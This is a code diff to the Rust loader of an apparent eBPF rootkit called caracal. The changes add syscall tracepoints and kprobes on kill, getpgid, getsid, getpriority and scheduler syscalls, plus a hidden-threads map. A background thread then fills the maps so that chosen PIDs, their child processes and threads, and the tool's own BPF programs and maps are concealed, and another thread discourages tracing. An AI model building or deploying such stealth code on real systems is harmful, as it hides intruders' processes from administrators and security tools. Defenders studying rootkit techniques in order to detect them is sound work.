@@ -3,7 +3,7 @@ use std::{thread, time::Duration};
 use aya::{maps::HashMap, EbpfLoader};
 use caracal::utils::{
     fetch_progs_ids_map_ids, get_descendants, get_progs_info_from_progs_ids, list_active_maps,
-    list_active_programs, write_to_tracefs, Builder, SyscallTracepoint,
+    list_active_programs, write_to_tracefs, Builder, Kprobe, SyscallTracepoint,
 };
 use caracal_common::{MAX_BPF_OBJ, MAX_HIDDEN_PIDS};
 use clap::Parser;
@@ -39,11 +39,51 @@ async fn main() -> anyhow::Result<()> {
     }
 
     let tracepoints = vec![
-        SyscallTracepoint::from(("caracal_bpf", "sys_enter_bpf")),
-        SyscallTracepoint::from(("caracal_pid_enter", "sys_enter_getdents64")),
-        SyscallTracepoint::from(("caracal_pid_exit", "sys_exit_getdents64")),
+        SyscallTracepoint::from(("bpf", "sys_enter_bpf")),
+        SyscallTracepoint::from(("pid_enter", "sys_enter_getdents64")),
+        SyscallTracepoint::from(("pid_exit", "sys_exit_getdents64")),
+        SyscallTracepoint::from(("statx_enter", "sys_enter_statx")),
+        SyscallTracepoint::from(("newfstatat_enter", "sys_enter_newfstatat")),
+        SyscallTracepoint::from(("chdir_enter", "sys_enter_chdir")),
+        SyscallTracepoint::from(("openat_enter", "sys_enter_openat")),
     ];
-
+    let kprobes = vec![
+        Kprobe::from(("x64_sys_kill_exit", "__x64_sys_kill")),
+        Kprobe::from(("x64_sys_kill_enter", "__x64_sys_kill")),
+        Kprobe::from(("x64_sys_getpgid_enter", "__x64_sys_getpgid")),
+        Kprobe::from(("x64_sys_getpgid_exit", "__x64_sys_getpgid")),
+        Kprobe::from(("x64_sys_getsid_enter", "__x64_sys_getsid")),
+        Kprobe::from(("x64_sys_getsid_exit", "__x64_sys_getsid")),
+        Kprobe::from(("x64_sys_getpriority_enter", "__x64_sys_getpriority")),
+        Kprobe::from(("x64_sys_getpriority_exit", "__x64_sys_getpriority")),
+        Kprobe::from(("x64_sys_sched_getparam_enter", "__x64_sys_sched_getparam")),
+        Kprobe::from(("x64_sys_sched_getparam_exit", "__x64_sys_sched_getparam")),
+        Kprobe::from((
+            "x64_sys_sched_getscheduler_enter",
+            "__x64_sys_sched_getscheduler",
+        )),
+        Kprobe::from((
+            "x64_sys_sched_getscheduler_exit",
+            "__x64_sys_sched_getscheduler",
+        )),
+        Kprobe::from((
+            "x64_sys_sched_rr_get_interval_exit",
+            "__x64_sys_sched_rr_get_interval",
+        )),
+        Kprobe::from((
+            "x64_sys_sched_rr_get_interval_enter",
+            "__x64_sys_sched_rr_get_interval",
+        )),
+        Kprobe::from((
+            "x64_sys_sched_getaffinity_enter",
+            "__x64_sys_sched_getaffinity",
+        )),
+        Kprobe::from((
+            "x64_sys_sched_getaffinity_exit",
+            "__x64_sys_sched_getaffinity",
+        )),
+    ];
+    //let kprobes = vec![];
     let mut ebpf = EbpfLoader::new().load(aya::include_bytes_aligned!(
         "../../target/bpfel-unknown-none/release/caracal"
     ))?;
@@ -53,6 +93,7 @@ async fn main() -> anyhow::Result<()> {
     let mut builder = Builder {
         ebpf: &mut ebpf,
         tracepoints,
+        kprobes,
     };
 
     // get bpf prog info used in caracal
@@ -66,6 +107,9 @@ async fn main() -> anyhow::Result<()> {
     // setup HIDDEN_PIDS MAP
     let mut hidden_pids_map: HashMap<_, u32, u8> =
         HashMap::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
+    // setup HIDDEN_TREADS MAP
+    let mut hidden_threads_map: HashMap<_, u32, u8> =
+        HashMap::try_from(ebpf.take_map("HIDDEN_THREADS").unwrap()).unwrap();
 
     // setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
     let mut hidden_obj_map: HashMap<_, u32, [u32; MAX_BPF_OBJ as usize]> =
@@ -154,29 +198,34 @@ async fn main() -> anyhow::Result<()> {
             }
         }
     });
+    thread::spawn(move || {
+        // wait for last thread (tokio loop) to start
+        thread::sleep(Duration::from_millis(1000));
 
-    // setup pid trees to hide
-    let mut sys = System::new_all();
-    let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
+        // setup pid/thread trees to hide
+        let mut sys = System::new_all();
+        let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
 
-    for p in pid.iter() {
-        info!("pid: {p} -> hide");
-        hidden_pids_map
-            .insert(p, 0, 0)
-            .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
-        let children = get_descendants(&sys, Pid::from(*p as usize));
-        for child in children.iter() {
-            if let Some(task) = sys.process(*child) {
-                info!("pid: {} -> hide child: {} [{:?}]", p, child, task.name());
-            } else {
-                info!("pid: {p} -> hide child: {child}");
-            }
-            info!("{}", child.as_u32());
+        for p in pid.iter() {
+            info!("pid: {p} -> hide");
             hidden_pids_map
-                .insert(child.as_u32(), 0, 0)
+                .insert(p, 0, 0)
                 .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
+            let (children_pid, children_threads) = get_descendants(&sys, Pid::from(*p as usize));
+            for child in children_pid.iter() {
+                hidden_pids_map
+                    .insert(child.as_u32(), 0, 0)
+                    .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
+            }
+            for child in children_threads.iter() {
+                hidden_threads_map
+                    .insert(child.as_u32(), 0, 0)
+                    .unwrap_or_else(|_| {
+                        panic!("TOO MANY THREADS PROVIDED (max {MAX_HIDDEN_PIDS})")
+                    });
+            }
         }
-    }
+    });
 
     // discourage tracing
     thread::spawn({
@@ -197,9 +246,7 @@ async fn main() -> anyhow::Result<()> {
         }
     });
     let ctrl_c = signal::ctrl_c();
-    println!("Waiting for Ctrl-C...");
     ctrl_c.await?;
     println!("Exiting...");
-
     Ok(())
 }
